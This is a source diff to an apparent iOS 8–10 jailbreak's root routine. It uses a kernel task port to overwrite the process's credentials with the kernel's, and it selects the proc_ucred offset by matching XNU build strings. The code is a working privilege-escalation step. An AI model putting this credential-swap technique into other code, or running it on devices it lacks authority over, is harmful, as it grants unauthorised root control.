@@ -17,6 +17,7 @@
 #include <sys/stat.h>
 #include <sys/mount.h>
 #include <sys/sysctl.h>
+#include <sys/types.h>
 #include <mach/mach.h>
 #include <sys/mman.h>
 #include <spawn.h>
@@ -711,10 +712,33 @@ int blizzardGetRoot(){
                 }
                 vm_read_overwrite(tfp0, proc, sz, (vm_address_t)&proc, &sz);
             }
-            vm_read_overwrite(tfp0, myProc + 0xa4, sz, (vm_address_t)&myUcred, &sz);
+            //backported from openpwnage. imo if using hardcoded offsets, better to base off kver instead of system ver due to how many people modify SystemVersion.plist despite being told not to. some tutorials for downgrading to iOS 8.4.1 do modify SystemVersion.plist rather than iOS-OTA-Downgrader, so a lot more people modify SystemVersion.plist, imo making this subtle difference even more important on 9.X/10.X than it is on other versions.
+            size_t size;
+            sysctlbyname("kern.version", NULL, &size, NULL, 0);
+            char *kernelVersion = malloc(size);
+            sysctlbyname("kern.version", kernelVersion, &size, NULL, 0);
+    
+            char *newkernv = malloc(size - 44);
+            char *semicolon = strchr(kernelVersion, '~');
+            int indexofsemi = (int)(semicolon - kernelVersion);
+            int indexofrootxnu = indexofsemi;
+            while (kernelVersion[indexofrootxnu - 1] != '-') {
+                indexofrootxnu -= 1;
+            }
+            memcpy(newkernv, &kernelVersion[indexofrootxnu], indexofsemi - indexofrootxnu + 2);
+            newkernv[indexofsemi - indexofrootxnu + 2] = '\0';
+            uint32_t proc_ucred_offset;
+            if ([[NSArray arrayWithObjects:@"3248.61.1~1",@"3248.60.9~1",@"3248.60.8~1",@"3248.60.4~1",@"3248.60.3~3",@"3248.50.21~4",@"3248.50.20~1",@"3248.50.18~1",@"3248.41.4~2",@"3248.41.4~3",@"3248.41.3~1",@"3248.40.173.0.1~1",@"3248.40.166.0.1~1",@"3248.40.155.1.1~3", nil] containsObject:KernelVersion()]) { //9.3b1-9.3.6
+                proc_ucred_offset = 0xa4;
+            } else if ([[NSArray arrayWithObjects:@"3248.31.3~2",@"3248.21.2~1",@"3248.21.1~2",@"3248.20.39~8",@"3248.20.33.0.1~7",@"3248.10.42~4",@"3248.10.41~1",@"3248.10.38~3",@"3248.10.27~1",@"3789.70.16~4", nil] containsObject:KernelVersion()]){ //9.1b1-9.2.1 (& 10.3.3, and potentially other iOS 10 versions)
+                proc_ucred_offset = 0x98;
+            } else { //iOS 9.0b1-9.0.2 (and 8.4/8.4.1 too)
+                proc_ucred_offset = 0x8c;
+            }
+            vm_read_overwrite(tfp0, myProc + proc_ucred_offset, sz, (vm_address_t)&myUcred, &sz);
             uint32_t kcred = 0;
-            vm_read_overwrite(tfp0, kproc + 0xa4, sz, (vm_address_t)&kcred, &sz);
-            vm_write(tfp0, myProc + 0xa4, (vm_address_t)&kcred, sz);
+            vm_read_overwrite(tfp0, kproc + proc_ucred_offset, sz, (vm_address_t)&kcred, &sz);
+            vm_write(tfp0, myProc + proc_ucred_offset, (vm_address_t)&kcred, sz);
             setuid(0);
             printf("[+] Got ROOT! Current User ID: %x\n", getuid());
             return 0;
